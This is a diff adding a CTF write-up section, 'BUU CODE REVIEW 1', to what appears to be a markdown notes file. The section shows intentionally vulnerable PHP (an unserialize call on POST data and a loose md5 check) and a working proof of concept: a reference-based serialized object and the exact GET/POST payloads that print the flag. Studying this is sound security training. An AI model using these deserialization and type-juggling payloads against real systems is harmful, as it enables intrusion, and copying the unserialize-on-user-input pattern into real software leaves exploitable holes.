@@ -91,4 +91,57 @@ $a->str->p = new Modifier();
 $b = new Show($a);
 echo urlencode(serialize($b));
 ?>
-`````
+```
+
+
+## BUU CODE REVIEW 1
+```
+
+class BUU {
+   public $correct = "";
+   public $input = "";
+
+   public function __destruct() {
+       try {
+           $this->correct = base64_encode(uniqid());
+           if($this->correct === $this->input) {
+               echo file_get_contents("/flag");
+           }
+       } catch (Exception $e) {
+       }
+   }
+}
+
+if($_GET['pleaseget'] === '1') {
+    if($_POST['pleasepost'] === '2') {
+        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
+            unserialize($_POST['obj']);
+        }
+    }
+}
+```
+
+poc
+
+```
+
+<?php
+class BUU {
+   public $correct = "";
+   public $input = "";
+
+   
+}
+
+$a = new BUU();
+$a->correct=&$a->input;
+echo serialize($a);
+
+#O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
+get:?pleaseget=1
+
+post:pleasepost=2&md51[]=1&md52[]=2&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
+```
+
+
+
